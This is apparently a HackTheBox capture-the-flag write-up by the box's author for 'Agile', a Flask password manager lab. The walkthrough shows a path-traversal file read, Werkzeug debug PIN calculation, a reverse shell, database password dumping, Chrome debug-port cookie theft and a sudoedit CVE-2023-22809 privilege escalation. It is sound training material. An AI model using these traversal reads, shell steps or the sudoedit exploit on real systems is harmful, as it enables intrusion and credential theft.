# HTB: Agile
Source: https://0xdf.gitlab.io/2023/08/05/htb-agile.html
Date: 2023-08-05

# HTB: Agile

ctf hackthebox htb-agile nmap ubuntu flask python feroxbuster file-read werkzeug werkzeug-debug flask-debug-pin youtube python-venv pytest selenium chrome chrome-debug sudoedit cve-2023-22809 idor flask-cookie htb-bagel htb-opensource htb-rainyday htb-noter cpts-like Aug 5, 2023

HTB: Agile

HTB: Agile

![Agile](/img/agile-cover.png)
Agile is a box hosting a password manager solution. There’s a file read vulnerability in the application, and the Flask server is running in debug mode. I’ll use those to get execution on the box, which turns out to be a bit trickier than expected. From there, I’ll dump a user’s password out of the database and get an SSH shell. There’s a testing version of the app running as well, and I’ll abuse Chrome debug to get credentials from the testing Chrome instance to pivot to the next user. This user can use sudoedit to modify files related to the test server. I’ll abuse CVE-2023-22809 to write into the virtual environment that root is sourcing to get root. In Beyond Root, I’ll show two unintended vulnerabilities in the web application that got patched about a week after release.

## Box Info

![Agile](/icons/box-agile.png)
![Linux](/icons/Linux.png)
![Rated difficulty for Agile](/img/agile-diff.png)
![Radar chart for Agile](/img/agile-radar.png)
![Ziemni](https://www.hackthebox.com/badge/image/12507)
![szymex73](https://www.hackthebox.com/badge/image/139466)
![0xdf](https://www.hackthebox.com/badge/image/4935)

## Author’s Note

Agile is the 5th box I’ve had released on HackTheBox. It’s always fun when I get to writeup my own creation, and I’ll take this chance to share a bit of background. I made this machine to look at a bad take on an agile / CICD workflow. The box is supposed to be a password manager product that is trying to be “agile”, but doing it all wrong. The developers here want to constantly be building the site, and they have put Flask in debug mode so that it automatically updates when there’s a change. There’s also a file read vulnerability in the site. There’s also a  cron constantly running PyTest tests against the site, a dev version. Finally, since this is the box used to host the site and everything around it is involved with the site, the admin has every user logging in sourcing the virtual environment constant running of tests on the dev version of the website, which keeps selenium open and chrome debug. The player can connect to this debug and get the session, and pull another password from the test database. Finally, the box is configured so that everyone logging in sources the venv used by the application. The last user has sudo edit privileges over some files as the admin, and CVE-2023-22809 can be used to edit the venv activate script and get execution as root.

I had a lot of fun learning HTMX for this box, which doesn’t come into the exploitation at all, but does provide a nice layer to make responsive web applications. It’s worth poking at how the web application works to get a feel for it.

## Recon

### nmap

nmap finds two open TCP ports, SSH (22) and HTTP (80):

```
nmap
```

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.203
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-28 13:06 EDT
Nmap scan report for superpass.htb (10.10.11.203)
Host is up (0.094s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.203
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-28 13:16 EDT
Nmap scan report for 10.10.11.203
Host is up (0.094s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.51 seconds
```

The website is redirecting to superpass.htb .

```
superpass.htb
```

I’ll use wfuzz or ffuf to fuzz for other subdomains, but not find any. I’ll add superpass.htb to my /etc/hosts file.

```
wfuzz
```

```
ffuf
```

```
superpass.htb
```

```
/etc/hosts
```

### Website - TCP 80

#### Site

The site is a password manager:

![image-20230124065153513](/img/image-20230728151109112.png)
![expand](/icons/expand.png)
I’ll create an account and now I’m redirected to /vault :

```
/vault
```

![image-20230728151212598](/img/image-20230728151212598.png)
Clicking “Add a password” opens a form with the password already filled in:

![image-20230728151329948](/img/image-20230728151329948.png)
Completing the rest of it and clicking the save / disk icon makes it no longer editable:

![image-20230728151401486](/img/image-20230728151401486.png)
Pushing the export button will download a CSV:

![image-20230124070022667](/img/image-20230124070022667.png)
![image-20230728151429925](/img/image-20230728151429925.png)

#### Tech Stack

The HTTP response headers show NGINX, but nothing else:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 28 Jul 2023 19:10:58 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 6128
```

Guessing at extensions doesn’t return anything. The 404 page matches the default 404 for Flask:

![image-20230728151646220](/img/image-20230728151646220.png)
This suggests the site is Python Flask.

#### Directory Brute Force

I’ll run feroxbuster against the site, but it doesn’t find anything I haven’t seen:

```
feroxbuster
```

```
oxdf@hacky$ feroxbuster -u http://superpass.htb --dont-extract-links

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://superpass.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      131l      307w     6128c http://superpass.htb/
302      GET        5l       22w      249c http://superpass.htb/download => http://superpass.htb/account/login?next=%2Fdownload
301      GET        7l       12w      178c http://superpass.htb/static => http://superpass.htb/static/
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://superpass.htb/static/css => http://superpass.htb/static/css/
301      GET        7l       12w      178c http://superpass.htb/static/js => http://superpass.htb/static/js/
301      GET        7l       12w      178c http://superpass.htb/static/img => http://superpass.htb/static/img/
302      GET        5l       22w      243c http://superpass.htb/vault => http://superpass.htb/account/login?next=%2Fvault
[####################] - 1m    150000/150000  0s      found:7       errors:0      
[####################] - 1m     30000/30000   417/s   http://superpass.htb/ 
[####################] - 1m     30000/30000   498/s   http://superpass.htb/static/ 
[####################] - 1m     30000/30000   498/s   http://superpass.htb/static/js/ 
[####################] - 1m     30000/30000   499/s   http://superpass.htb/static/css/ 
[####################] - 1m     30000/30000   498/s   http://superpass.htb/static/img/
```

## Shell as www-data

### Export in More Detail

#### Enumeration

Looking in Burp, I’ll see that when I click on Export, there’s a GET request to /vault/export , which returns a 302 to /download?fn=[username]_export_[some hex].csv . Neither of these ever show up in the browser address bar, because the end result is a file that’s downloaded.

```
/vault/export
```

```
/download?fn=[username]_export_[some hex].csv
```

![image-20230124105105827](/img/image-20230124105105827.png)

#### Vulnerabilities

There’s two vulnerabilities to identify in /download . The first is a directory traversal / file read vulnerability:

```
/download
```

![image-20230124105329636](/img/image-20230124105329636.png)
The second is that if the file path isn’t good, the page crashes revealing that the server is running Flask in debug mode:

![image-20230124105409841](/img/image-20230124105409841.png)

### Flask Debug Execution

#### Background

The debug page for Flask is made for developers to find a crash and figure out what happened. It gives not only the stack trace, but also the ability to get a Python console and run additional commands at the point of the crash. If I move my mouse over one of the outputs, the little terminal logo appears:

![image-20230728153444859](/img/image-20230728153444859.png)
Clicking on the terminal pops a message asking for the PIN:

![image-20230124135056120](/img/image-20230124135056120.png)
This is a safety mechanism that wasn’t present in early versions of the debug page (added in version 0.11 , released Nov 2015). This pin is printed to the terminal when the Flask site is run. If I have the pin, I can get execution on the system. To calculate the pin, I’ll need to collect a handful of strings from the system, using the file read vulnerability.

HackTricks has a writeup on generating the pin, showing how it is generated in the Flask (specifically in the werkzeug module) source, and providing a script. I’ll grab a copy of that script, and I’ll need to update several things. I’ve shown this before as an unintended method on OpenSource .

```
werkzeug
```

The big trick on Agile is that most the guides (including the HackTricks and my post) make assumptions about one of the items you need, and that assumption is not always correct. I’ll start following the guides, fail, and then show how to fix it.

#### Public Bits

The first part of the script that requires updating is the list named probably_public_bits .

```
probably_public_bits
```

```
probably_public_bits = [
    'web3_user',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]
```

To get the username, I’ll check /proc/self/environ using the file read vuln:

```
/proc/self/environ
```

![image-20230801122410810](/img/image-20230801122410810.png)
The server is running as www-data.

In previous guides, the second item is always given as “flask.app” and the third as “Flask”. We’ll come back to these.

The fourth item is the full path to the application, which is in the crashdump:

![image-20230728154053888](/img/image-20230728154053888.png)
My script looks like:

```
probably_public_bits = [
    'www-data',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]
```

#### Private Bits

The next section is the list private_bits :

```
private_bits
```

```
private_bits = [
    '279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]
```

I’m going to switch to curl here for ease. I’ll need to use --path-as-is so that curl doesn’t undo the ../ , and I’ll need the cookie, which I’ll save in an env variable. I’ll need to get the MAC address. I can find that at /sys/class/net/[device]/address . To get the device name, I’ll pull /proc/net/arp :

```
curl
```

```
--path-as-is
```

```
curl
```

```
../
```

```
/sys/class/net/[device]/address
```

```
/proc/net/arp
```

```
oxdf@hacky$ cookie="session=.eJwlzj0OwjAMQOG7ZGaIncQ_vUwVx7ZgbemEuDuV2N709H3Knkecz7K9jyseZX952cpMQegkZGndnMfEfqdWlYSIBPeqidw6rWU652CvyUiGzVFMqVWjlg6hstLMg5ciopvyjCHV2To1WUiTnIj53g_oQLEEpNyQ64zjr9Hy_QEv9zBO.ZMQS_Q.Z4LXfnoQS3utplGKkJ9ScRF8EMY"
oxdf@hacky$ curl http://superpass.htb/download?fn=../../../../proc/net/arp -s --path-as-is -b $cookie
IP address       HW type     Flags       HW address            Mask     Device
10.10.10.2       0x1         0x2         00:50:56:b9:1d:c2     *        eth0
```

The device is eth0 , which I’ll use to get the MAC:

```
eth0
```

```
oxdf@hacky$ curl http://superpass.htb/download?fn=../../../../sys/class/net/eth0/address -s --path-as-is -b $cookie
00:50:56:b9:48:b5
```

The script needs this as an int, which I can use Python to convert:

```
>>> int("00:50:56:b9:48:b5".replace(':',''), 16)
345052367029
```

The next item is a combination of a couple files. First, I need /etc/machine-id :

```
/etc/machine-id
```

```
oxdf@hacky$ curl http://superpass.htb/download?fn=../../../../etc/machine-id -s --path-as-is -b $cookie
ed5b159560f54721827644bc9b220d00
```

I’ll also need the first line of /proc/self/cgroup , from the last “/” to the end:

```
/proc/self/cgroup
```

```
oxdf@hacky$ curl http://superpass.htb/download?fn=../../../../proc/self/cgroup -s --path-as-is -b $cookie
0::/system.slice/superpass.service
```

I only need the “superpass.service” part.

Putting that all together updates the script to:

```
private_bits = [
    '345052367029',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'ed5b159560f54721827644bc9b220d00superpass.service'# get_machine_id(), /etc/machine-id
]
```

#### Hash Algorithm

I’ll run this and it outputs a pin:

```
oxdf@hacky$ python agile.py 
276-150-242
```

But it doesn’t work:

![image-20230728170845041](/img/image-20230728170845041.png)
One possible issue has to do with the hash algorithm in use. Werkzurg updated their code from MD5 to SHA1 a while ago. At the time of Agile’s release, there was a note on the Hacktricks page:

If you are on a new version of Werkzeug, try changing the hashing algorithm to sha1 instead of md5.

By the time Agile is retiring, the script is just updated to use SHA1. To verify this, I’ll pull the file from Agile and confirm it’s using SHA1 (not MD5):

![image-20230124141825362](/img/image-20230124141825362.png)
I’ll make sure my script is not using MD5, and if it is, fix it:

```
...[snip]...
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
...[snip]...
```

Now on running this generates a new pin:

```
oxdf@hacky$ python agile.py 
962-630-184
```

But it still doesn’t work.

#### getattr(app, ‘__name__’)

Guides show the third item in probably_public_bits typically as just “Flask”, but that isn’t always the case. It has to do with how Flask is launched on the host.

```
probably_public_bits
```

I’ll demonstrate that in this video where I make a HelloWorld Flask application and show how the variables change.

Side note: I’m still very interested in why Ubuntu Desktop doesn’t return “correct” values for getnode . If you have any idea, please reach out to me on Twitter or Discord).

```
getnode
```

In this next video , I’ll collect the correct data for Agile to get the pin:

I’ll see how the application is running, recreate a version of it on my machine. In that version, I’ll update the Werkzeug package to print the things that go into the pin when it’s created, and show that it actually prints three times:

```
(venv) oxdf@hacky$ python wsgi.py 
 * Serving Flask app 'superpass.app'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
pub: ['oxdf', 'flask.app', 'wsgi_app', '/home/oxdf/agile/venv/lib/python3.11/site-packages/flask/app.py']
priv: ['32885290718598', b'060456d303a2469db9ea10ab03306411session-c2.scope']
 * Debugger PIN: 198-691-424
 * Debugger is active!
pub: ['oxdf', 'werkzeug.debug', 'DebuggedApplication', '/home/oxdf/agile/venv/lib/python3.11/site-packages/werkzeug/debug/__init__.py']
priv: ['32885290718598', b'060456d303a2469db9ea10ab03306411session-c2.scope']
 * Debugger PIN: 101-681-536
 * Debugger is active!
pub: ['oxdf', 'flask.app', 'Flask', '/home/oxdf/agile/venv/lib/python3.11/site-packages/flask/app.py']
priv: ['32885290718598', b'060456d303a2469db9ea10ab03306411session-c2.scope']
 * Debugger PIN: 659-317-709
```

With some playing around, I’ll see that what I need is “wsgi_app”, which comes from the fact that this is served using Gunicorn.

#### Success

I’ll update and get a new pin, and it works:

![image-20230124142043404](/img/image-20230124142043404.png)

### Shell

It looks like the os module is imported already:

```
os
```

![image-20230124142118360](/img/image-20230124142118360.png)
I’ll use Python #2 from revshells.com , pasting it directly into the console:

![image-20230124142547688](/img/image-20230124142547688.png)
The page hangs, but I get a shell:

```
oxdf@hacky$ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.1.1.105 51078
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as corum

The shell will only last about 5 minutes based on the connection, so it’s important to work quick (or just get another shell). With access as www-data, I can read the DB connection string from /app/config_prod.json :

```
/app/config_prod.json
```

```
(venv) www-data@agile:/app$ cat config_prod.json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

I’ll use that to connect to the database and dump the passwords:

```
(venv) www-data@agile:/app$ mysql -u superpassuser -p'dSA6l7q*yIVs$39Ml6ywvgK' superpass
...[snip]...
mysql> select * from passwords;
+-----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id  | created_date        | last_updated_data   | url            | username | password             | user_id |
+-----+---------------------+---------------------+----------------+----------+----------------------+---------+
|   3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|   4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|   6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|   7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|   8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
| 195 | 2023-01-24 15:52:50 | 2023-01-24 15:52:50 | asdfasdf       | sadfsadf | 378ea0c651fa7964d9b5 |       5 |
+-----+---------------------+---------------------+----------------+----------+----------------------+---------+
6 rows in set (0.00 sec)
```

There’s a password for “agile” for the corum user. It works over ssh:

```
oxdf@hacky$ sshpass -p '5db7caa1d13cc37c9fc2' ssh corum@superpass.htb
...[snip]...
corum@agile:~$
```

## Shell as edwards

### Enumeration

#### Web Apps

There’s a parallel testing/dev instance of the site in /app :

```
/app
```

```
corum@agile:/app$ ls -l
total 24
drwxr-xr-x 5 corum     runner    4096 Jan 23 21:50 app
drwxr-xr-x 8 runner    runner    4096 Jan 25 17:29 app-testing
-r--r----- 1 dev_admin www-data    88 Jan 25 00:00 config_prod.json
-r--r----- 1 dev_admin runner      99 Jan 25 15:15 config_test.json
-rwxr-xr-x 1 root      runner     557 Jan 25 17:36 test_and_update.sh
drwxrwxr-x 5 root      dev_admin 4096 Jan 25 17:21 venv
```

As corum, I’m able to access everything in app . I can read almost everything in app-testing as well.

```
app
```

```
app-testing
```

The test_and_update.sh script is also readable:

```
test_and_update.sh
```

```
#!/bin/bash

# update prod with latest from testing constantly assuming tests are passing

echo "Starting test_and_update"
date

# if already running, exit
ps auxww | grep -v "grep" | grep -q "pytest" && exit

echo "Not already running. Starting..."

# start in dev folder
cd /app/app-testing

# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate

# run tests, exit if failure
pytest -x 2>&1 >/dev/null || exit

# tests good, update prod (flask debug mode will load it instantly)
cp -r superpass /app/app/
echo "Complete!"
```

It checks if pytest is already running, and if so, exits. Then it goes into the app-testing folder, sources the local env that’s shared between the apps, and calls pytest . If it succeeds, it copies the superpass folder into /app/app (if it passes tests, deploy!).

```
pytest
```

```
app-testing
```

```
pytest
```

```
superpass
```

```
/app/app
```

There’s one file of tests in app-testing :

```
app-testing
```

```
corum@agile:/app/app-testing/tests/functional$ ls -l
total 12
drwxrwxr-x 2 runner runner 4096 Jan 25 17:06 __pycache__
-rw-r----- 1 dev_admin runner   34 Jan 25 15:15 creds.txt
-rw-r--r-- 1 runner runner 2663 Jan 25 17:05 test_site_interactively.py
```

corum can’t read creds.txt . It’s used in test_site_interactively to log into the page on test.superpass.htb :

```
creds.txt
```

```
test_site_interactively
```

```
test.superpass.htb
```

```
with open('/app/app-testing/tests/functional/creds.txt', 'r') as f:
    username, password = f.read().strip().split(':')
    
...[snip]...

def test_login(driver):
    print("starting test_login")
    driver.get('http://test.superpass.htb/account/login')
    time.sleep(1)
    username_input = driver.find_element(By.NAME, "username")
    username_input.send_keys(username)
    password_input = driver.find_element(By.NAME, "password")
    password_input.send_keys(password)
    driver.find_element(By.NAME, "submit").click()
    time.sleep(3)
    title = driver.find_element(By.TAG_NAME, "h1")
    assert title.text == "Welcome to your vault"
```

It’s using Selenium with headless Chrome to load the site:

```
@pytest.fixture(scope="session")
def driver():
    options = Options()
    #options.add_argument("--no-sandbox")
    options.add_argument("--window-size=1420,1080")
    options.add_argument("--headless")
    options.add_argument("--remote-debugging-port=41829")
    options.add_argument('--disable-gpu')
    options.add_argument('--crash-dumps-dir=/tmp')
    driver = webdriver.Chrome(options=options)
    yield driver
    driver.close()
```

The remote debug port is fixed on 41829.

#### test.superpass.htb

The test.superpass.htb site is defined in cat superpass-test.nginx :

```
test.superpass.htb
```

```
cat superpass-test.nginx
```

```
server {
    listen 127.0.0.1:80;
    server_name test.superpass.htb;

    location /static {
        alias /app/app-testing/superpass/static;
        expires 365d;
    }
    location / {
        include uwsgi_params;
        proxy_pass http://127.0.0.1:5555;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Protocol $scheme;
    }
}
```

It’s only listening on localhost, and it’s proxying everything to localhost 5555. If I try to update my hosts file to include this domain and access it directly, it just redirects to superpass.htb . That’s because I’m not coming from localhost. The easiest way to access it is just to tunnel directly to TCP 5555 on Agile, so I’ll do that by reconnecting my SSH as corum with -L 5555:localhost:5555 .

```
superpass.htb
```

```
-L 5555:localhost:5555
```

The page looks exactly the same, but there are a few differences. The file read vuln doesn’t work anymore:

![image-20230801130804616](/img/image-20230801130804616.png)
Also, the server isn’t running in debug mode:

![image-20230801130654093](/img/image-20230801130654093.png)

### Chrome Debug

Because the tests take a long time, this means the chrome debug port will almost always be up.

```
corum@agile:/app/app-testing/tests/functional$ netstat -tnlp | grep 41829
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:41829         0.0.0.0:*               LISTEN      -
```

I’ll use SSH to tunnel 41829 on my host to 41829 on Agile.

I’ll open Chromium and go to chrome://inspect and go to the devices page:

```
chrome://inspect
```

![image-20230125130214794](/img/image-20230125130214794.png)
I’ll add the port under Configure:

![image-20230125130242387](/img/image-20230125130242387.png)
And clicking done shows a new remote target:

![image-20230125130301432](/img/image-20230125130301432.png)
Clicking on “inspect” pops a dev tools instance connected to the testing selenium:

![image-20230125130404589](/img/image-20230125130404589.png)
If I watch long enough or catch on at the right time, I can get a view of edwards’ vault. A more reliable way is to go to the application tab where I can get the cookies in use:

![image-20230125130512878](/img/image-20230125130512878.png)
I can tunnel to port 5555, and add these cookies to my browser to get access to a new vault:

![image-20230125130709692](/img/image-20230125130709692.png)
There’s another password for “agile”, for the edwards user.

```
oxdf@hacky$ sshpass -p 'd07867c6267dcb5df0af' ssh edwards@superpass.htb
...[snip]...
edwards@agile:~$
```

## Shell as root

### Enumeration

#### sudo

edwards can run sudoedit as dev_admin to edit the config_test.json and the creds.txt file:

```
sudoedit
```

```
config_test.json
```

```
creds.txt
```

```
edwards@agile:~$ sudo -l
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

I’ll also note the version of sudo running here:

```
sudo
```

```
edwards@agile:~$ sudo -V
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

This version is vulnerable to CVE-2023-22809 . This vulnerability allows a user to provide extra arguments in user-proivded environment variables, allowing the attacker to access additional files to process beyond the one’s allowed by the config. Applied here allows edwards to write any file as dev_admin, not just these two.

#### venv

It turns out that any shell on Agile is running with the Python virtual environment activated. There are a few different ways to find this.

In some reverse shells, just running bash will have the (venv) prompt come on:

```
bash
```

```
(venv)
```

![image-20230125132102211](/img/image-20230125132102211.png)
If I look for where Python in on disk, I’ll see it returns the one in the venv folder, and that the venv folder has been added to the front of the session’s PATH variable:

```
venv
```

```
venv
```

```
PATH
```

```
corum@agile:~$ which python
/app/venv/bin/python
corum@agile:~$ echo $PATH
/app/venv/bin:/app/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

This happens because the global bashrc file includes sourcing the venv on this box:

```
bashrc
```

```
edwards@agile:~$ tail -2 /etc/bash.bashrc 
# all users will want the env associated with this application
source /app/venv/bin/activate
```

There’s a hint at this in a comment in the test_and_update.sh script as well:

```
test_and_update.sh
```

```
...[snip]...
# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate
...[snip]...
```

### Shell as root

root is periodically logging in, and each time it will source /app/venv/bin/activate . If I can edit that, I can get execution as root. This file is writable by root and dev_admin:

```
/app/venv/bin/activate
```

```
edwards@agile:/$ ls -l /app/venv/bin/activate
-rw-rw-r-- 1 root dev_admin 1976 Jan 25 18:24 /app/venv/bin/activate
```

I’ll abuse CVE-2023-22809 to write this file as dev_admin:

```
edwards@agile:/$ EDITOR='vim -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json 
[sudo] password for edwards:
```

In the file, I’ll add code to create a SUID bash:

![image-20230125133012362](/img/image-20230125133012362.png)
After the next minute, the backdoor is now in /tmp , and gives a shell:

```
/tmp
```

```
edwards@agile:/$ /tmp/0xdf -p
edwards@agile:/# id
uid=1002(edwards) gid=1002(edwards) euid=0(root) groups=1002(edwards)
```

## Beyond Root

### Unintendeds Patched

Agile was patched after it’s week in the season scoring to fix two vulnerabilities:

![image-20230801134538403](/img/image-20230801134538403.png)
I’ll look at each here.

### IDOR

There was an insecure direct object reference vulnerability in the get_password_by_id function. This allowed users to find the /vault/row/<id> endpoint and request passwords from other users, leaking corum’s password, skipping the Flask debug step.

```
get_password_by_id
```

```
/vault/row/<id>
```

The route used a function in /app/app/superpass/services/password_service.py called get_password_by_id .

```
/app/app/superpass/services/password_service.py
```

```
get_password_by_id
```

The code on release day was this:

```
def get_password_by_id(id: int, userid: int) -> Optional[Password]:

    session = db_session.create_session()
    password = session.query(Password)\
        .filter(
            Password.id == id,
            User.id == userid
        ).first()

    session.close()

    return password
```

On first look, it looks like the app is checking for passwords that match the given ID and the current user’s ID. Unfortunately for me, that is a copy and paste typo, as the last check is comparing User.id and userid . The function is called with the current user’s ID, which is userid . User is from the data models. The problem is that a Password object doesn’t have a User, so it makes no sense here, and just silently does nothing. This was patched by changing the query to:

```
User.id
```

```
userid
```

```
userid
```

```
User
```

```
password = session.query(Password)\
        .filter(
            Password.id == id,
            Password.userid == userid
        ).first()
```

### Cookie Crafting

The first step of the box is to use Flask debug to get onto the host and get database access to get corum’s password. This could be bypassed by reading the source code for the application. On initial release, it has a static SECRET_KEY value set at the top of the file:

```
SECRET_KEY
```

![image-20230801140349030](/img/image-20230801140349030.png)
With access to this key, it is easy to forge a Flask cookie for any user (like in Rainyday or Noter ). Reading the /etc/passwd file will give usernames to try, and then logged in as corum, it’s as simple as SSHing into Agile.

```
/etc/passwd
```

This was patched by setting this to a random 32 characters on each application startup:

```
app = flask.Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
```

This strategy has drawbacks - if the application restarts, then all existing cookies become invalid. That might bring real issues in the real world, but it works perfectly well for a HTB machine.